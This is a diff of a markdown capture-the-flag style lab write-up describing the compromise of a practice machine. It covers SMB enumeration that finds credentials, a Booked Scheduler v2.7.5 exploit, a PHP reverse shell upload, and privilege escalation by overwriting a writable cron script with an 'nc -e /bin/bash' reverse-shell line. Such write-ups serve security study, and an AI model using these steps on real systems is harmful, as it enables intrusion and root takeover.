@@ -18,16 +18,16 @@ IP: 192.168.108.64
 - Found Booked Scheduler v2.7.5 exploit
 - Followed the exploit steps and received a reverse shell running as www-data
 - Found a cronjob which is writable  running every 3 minutes
-- Modified the cronjob 
-- Text
+- Modified the cronjob inputting a os.system reverse shell 
 
 ## Improved skills
 - SMB enumeration
-- Cronjob modifying
+- Cronjob modification
 
 ## Used tools
 - nmap
-- gobuster
+- smbmap
+- linpeas
 
 ---
 
@@ -152,38 +152,38 @@ Enumerated top 200 UDP ports:
 
 ##### -Per NMAP scan port 445 was open. Typed "smbmap -H 192.168.108.64" and found share "zino" which had read permissions to Logs files:
 
-![](Pasted%20image%2020221018230328.png)
+![](Images/Pasted%20image%2020221018230328.png)
 
 #### -Typed "smbmap -R zino -H 192.168.108.64" and found the following files in the "zino" share logs files:
 
-![](Pasted%20image%2020221018230621.png)
+![](Images/Pasted%20image%2020221018230621.png)
 
 #### -Typed "smbmap -R zino -H 192.168.108.64 -A misc.log" as well as every other file listed in the zino share to download to my kali machine:
 
-![](Pasted%20image%2020221018230715.png)
+![](Images/Pasted%20image%2020221018230715.png)
 
 #### -Typed "cat 192.168.108.64-zino_misc.log" and found username "admin" password "adminadmin":
 
-![](Pasted%20image%2020221018230819.png)
+![](Images/Pasted%20image%2020221018230819.png)
 
 ## Port 8003 - Apache httpd 2.4.38
 
 #### -Navigated to http://192.168.108.64:8003 as nmap scan showed port 8003 as an http apache server and found the below web page showing file/folder "booked":
 
-![](Pasted%20image%2020221018230914.png)
+![](Images/Pasted%20image%2020221018230914.png)
 
 #### -Clicked on the "booked" link and was navigated to the below web page showing "booked scheduler v2.7.5"
 
-![](Pasted%20image%2020221018231035.png)
+![](Images/Pasted%20image%2020221018231035.png)
 
 #### -Googled "Booked Scheduler v2.7.5 exploit python" and found the below webpage and found the following steps:
 
-![](Pasted%20image%2020221018231314.png)
+![](Images/Pasted%20image%2020221018231314.png)
 
-![](Pasted%20image%2020221018231353.png)
-![](Pasted%20image%2020221018231437.png)
-![](Pasted%20image%2020221018231522.png)
-![](Pasted%20image%2020221018231803.png)
+![](Images/Pasted%20image%2020221018231353.png)
+![](Images/Pasted%20image%2020221018231437.png)
+![](Images/Pasted%20image%2020221018231522.png)
+![](Images/Pasted%20image%2020221018231803.png)
 #BookedSchedulerv2.7.5RCEexploit
 ---
 
@@ -195,7 +195,7 @@ Enumerated top 200 UDP ports:
 
 #### -Typed "locate webshells" and created a file named "reverse.php" and copied "/usr/share/webshells/php/php-reverse-shell.php" into the file and change ip adress to my kali machine's ip and changed port number to 8003
 
-![](Pasted%20image%2020221018232029.png)
+![](Images/Pasted%20image%2020221018232029.png)
 
 #### -Navigated to "192.168.235.64:8003/booked/Web/admin/manage_theme.php"
 
@@ -203,7 +203,7 @@ Enumerated top 200 UDP ports:
 
 #### -Started a reverse listener on port 8003 and navigated to http://192.168.235.64:8003/booked/Web/custom-favicon.php/reverse.php and received a reverse shell:
 
-![](Pasted%20image%2020221018232149.png)
+![](Images/Pasted%20image%2020221018232149.png)
 
 ---
 
@@ -211,22 +211,22 @@ Enumerated top 200 UDP ports:
 ## Local Enumeration
 
 #### -Per linpeas.sh scan I found the following cronjob running every 3 minutes
-![](Pasted%20image%2020221018232421.png)
+![](Images/Pasted%20image%2020221018232421.png)
 
 ## Privilege Escalation vector
 ## Found a cronjob which is writable  running every 3 minutes
 
 #### -Cat'd "/var/www/html/booked/cleanup.py" and found the following:
-![](Pasted%20image%2020221018232524.png)
+![](Images/Pasted%20image%2020221018232524.png)
 
 ##### -As I kept receiving errors when trying to navigate on "vi" locally on target machine I created a "cleanup.py" file on my kali machine and changed "rm -r /var/www/html/booked/uploads/reservation/* " to "nc -e /bin/bash 192.168.49.235 21":
 
-![](Pasted%20image%2020221018232639.png)
+![](Images/Pasted%20image%2020221018232639.png)
 #CronJobmodificationPrivilegeEscalation
 
 ##### -I then uploaded the "cleanup.py" script I created onto target machine and typed "mv cleanup.py /var/www/html/booked/" to overwrite the existing cleanup.py file in /var/www/html/booked/ and started a netcat listener on port 21 and waited a few minutes and received a root shell:
 
-![](Pasted%20image%2020221018232733.png)
+![](Images/Pasted%20image%2020221018232733.png)
 
 
 ---
